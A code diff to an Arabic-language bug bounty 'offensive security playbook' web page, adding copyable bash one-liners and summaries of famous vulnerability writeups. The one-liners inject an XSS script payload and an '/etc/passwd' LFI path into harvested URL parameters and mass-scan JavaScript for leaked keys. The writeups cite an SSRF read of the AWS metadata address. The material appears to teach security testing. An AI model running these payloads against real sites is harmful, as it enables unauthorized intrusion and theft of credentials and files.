@@ -6,8 +6,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Offensive Security Playbook & Methodology | Abdo Ramdan</title>
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700&family=Outfit:wght@400;600;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="css/style.css?v=11">
-  <link rel="stylesheet" href="css/methodology.css?v=11">
+  <link rel="stylesheet" href="css/style.css?v=12">
+  <link rel="stylesheet" href="css/methodology.css?v=12">
 
   
 
@@ -2430,29 +2430,47 @@ X-Forwarded-Host: evil.com</div>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>🗺️ Advanced Automation pipeline flow</h3></div>
-          <div class="flow-visualization">
-            <div class="flow-node active-stage">subfinder -d target.com -silent</div>
-            <div class="flow-arrow">➔</div>
-            <div class="flow-node">httpx -silent</div>
-            <div class="flow-arrow">➔</div>
-            <div class="flow-node">katana -jc -silent</div>
-            <div class="flow-arrow">➔</div>
-            <div class="flow-node">gau --threads 5</div>
-            <div class="flow-arrow">➔</div>
-            <div class="flow-node">ffuf -w wordlist.txt</div>
-            <div class="flow-arrow">➔</div>
-            <div class="flow-node">nuclei -severity high,critical</div>
+          <div class="card-header"><h3>🔥 Elite Bash One-Liners (أسلحة سطر الأوامر)</h3></div>
+          <p>المحترفون لا يشغلون كل أداة على حدة، بل يدمجونها في سطر واحد (One-Liner) لاصطياد الثغرات تلقائياً:</p>
+          
+          <h4 style="margin-top:15px; color:var(--neon-cyan);">1. Automated XSS Hunter (الكشف التلقائي عن XSS):</h4>
+          <p style="color:var(--text-secondary); font-size:0.9rem;">يجلب كل الروابط، يفلترها للتي تقبل معاملات (Parameters)، يستبدلها بحمولة XSS، ثم يرسلها لأداة Dalfox لفحصها.</p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">waybackurls target.com | grep "=" | qsreplace '">&lt;script&gt;alert(1)&lt;/script&gt;' | dalfox pipe</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('waybackurls target.com | grep \"=\" | qsreplace \'\"><script>alert(1)</script>\' | dalfox pipe', this)">📋 Copy</button>
+            </div>
+          </div>
+
+          <h4 style="margin-top:15px; color:var(--neon-purple);">2. Automated LFI & Open Redirect Finder:</h4>
+          <p style="color:var(--text-secondary); font-size:0.9rem;">يستخرج الروابط التي تحوي مسارات ملفات ويختبرها للـ LFI.</p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">gau target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('gau target.com | gf lfi | qsreplace \"/etc/passwd\" | xargs -I% -P 25 sh -c \'curl -s \"%\" 2>&1 | grep -q \"root:x\" && echo \"VULN! %\"\'', this)">📋 Copy</button>
+            </div>
+          </div>
+
+          <h4 style="margin-top:15px; color:var(--neon-green);">3. Mass Secrets & API Keys Scanner (صائد المفاتيح):</h4>
+          <p style="color:var(--text-secondary); font-size:0.9rem;">يستخرج كل ملفات الجافاسكريبت ويبحث بداخلها عن مفاتيح سحابية مسربة باستخدام Nuclei.</p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">subfinder -d target.com -silent | httpx -silent | katana -jc -silent | grep "\.js$" | nuclei -t ~/nuclei-templates/exposures/ -silent</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('subfinder -d target.com -silent | httpx -silent | katana -jc -silent | grep \"\\.js$\" | nuclei -t ~/nuclei-templates/exposures/ -silent', this)">📋 Copy</button>
+            </div>
           </div>
         </div>
 
-        <div class="cyber-card">
-          <div class="card-header"><h3>🔗 Automation Commands</h3></div>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top">subfinder -d target.com -silent | httpx -silent | nuclei -t cves/</div>
-            <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('subfinder -d target.com -silent | httpx -silent | nuclei -t cves/', this)">📋 Copy</button>
-            </div>
+        <div class="cyber-card border-neon">
+          <div class="card-header"><h3 style="color:#00ff66;">🗺️ Advanced Workflow Diagram</h3></div>
+          <div class="flow-visualization">
+            <div class="flow-node active-stage">Recon<br><span style="font-size:0.7rem;">Subfinder/Amass</span></div>
+            <div class="flow-arrow">➔</div>
+            <div class="flow-node" style="border-color:#ffaa00; color:#ffaa00">Alive Targets<br><span style="font-size:0.7rem;">Httpx</span></div>
+            <div class="flow-arrow">➔</div>
+            <div class="flow-node" style="border-color:#9b59ff; color:#9b59ff">Crawling<br><span style="font-size:0.7rem;">Katana/Gau</span></div>
+            <div class="flow-arrow">➔</div>
+            <div class="flow-node" style="border-color:#ff0055; color:#ff0055">Vulnerability Scanning<br><span style="font-size:0.7rem;">Nuclei/Dalfox</span></div>
           </div>
         </div>
       
@@ -2732,13 +2750,26 @@ Content-Type: application/json
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>🏢 Real Bug Bounty Reports</h3></div>
-          <p>نماذج واقعية من تقارير حقيقية مقبولة على منصة HackerOne و Bugcrowd:</p>
-          <ul class="t-check-list">
-            <li>✔ <strong>Report 1:</strong> BOLA on OAuth user profile update ($1,500 bounty)</li>
-            <li>✔ <strong>Report 2:</strong> Subdomain takeover on enterprise staging server ($500 bounty)</li>
-            <li>✔ <strong>Report 3:</strong> IDOR allowing complete catalog data download (Hall of fame)</li>
-          </ul>
+          <div class="card-header"><h3>🏢 Legendary HackerOne Writeups (أخطر التقارير)</h3></div>
+          <p>قراءة تقارير كبار الهاكرز هي أسرع طريقة لتطوير عقليتك. إليك ملخص لأشهر الثغرات في التاريخ:</p>
+          
+          <div style="margin-top:20px;">
+            <h4 style="color:var(--neon-cyan);">1. Shopify Full Takeover via Race Condition ($50,000 Bounty)</h4>
+            <p style="color:var(--text-secondary); margin-bottom:10px;">اكتشف الباحث إمكانية إضافة شريك (Collaborator) إلى أي متجر Shopify بدون موافقة المالك، عن طريق إرسال طلب الموافقة وطلب القبول في نفس اللحظة (Race Condition).<br>
+            <strong>العبرة:</strong> الثغرات المنطقية لا تكتشفها الأدوات الآلية، يجب أن تفكر كالمطور!</p>
+          </div>
+
+          <div style="margin-top:20px; border-top:1px solid rgba(255,255,255,0.05); padding-top:20px;">
+            <h4 style="color:#ffaa00;">2. GitLab ExifTool RCE CVE-2021-22205 ($20,000 Bounty)</h4>
+            <p style="color:var(--text-secondary); margin-bottom:10px;">وجد الباحث أن GitLab يستخدم أداة ExifTool لقراءة بيانات الصور المرفوعة. قام بصناعة صورة خبيثة (DjVu Image) تحتوي على كود Perl. بمجرد أن قرأها السيرفر، تم تنفيذ الكود (RCE) واختراق خوادم GitLab.<br>
+            <strong>العبرة:</strong> اختراق المكتبات المساعدة (Third-party libraries) أسهل من اختراق الكود الأساسي.</p>
+          </div>
+
+          <div style="margin-top:20px; border-top:1px solid rgba(255,255,255,0.05); padding-top:20px;">
+            <h4 style="color:#ff0055;">3. Starbucks SSRF to AWS Metadata ($10,000+ Bounty)</h4>
+            <p style="color:var(--text-secondary); margin-bottom:10px;">من خلال خاصية "إنشاء تقرير PDF" في أحد مواقع ستاربكس الداخلية، قام الباحث بوضع رابط `http://169.254.169.254/latest/meta-data/`. قام السيرفر بجلب بيانات AWS السرية للملف ووضعها في الـ PDF. الباحث سحب الـ IAM Keys الخاصة بالشركة!<br>
+            <strong>العبرة:</strong> أي ميزة تقوم بتحويل محتوى (URL to PDF, Webhooks, Image Fetching) هي هدف ذهبي للـ SSRF.</p>
+          </div>
         </div>
       
         <!-- MARK PHASE COMPLETE -->
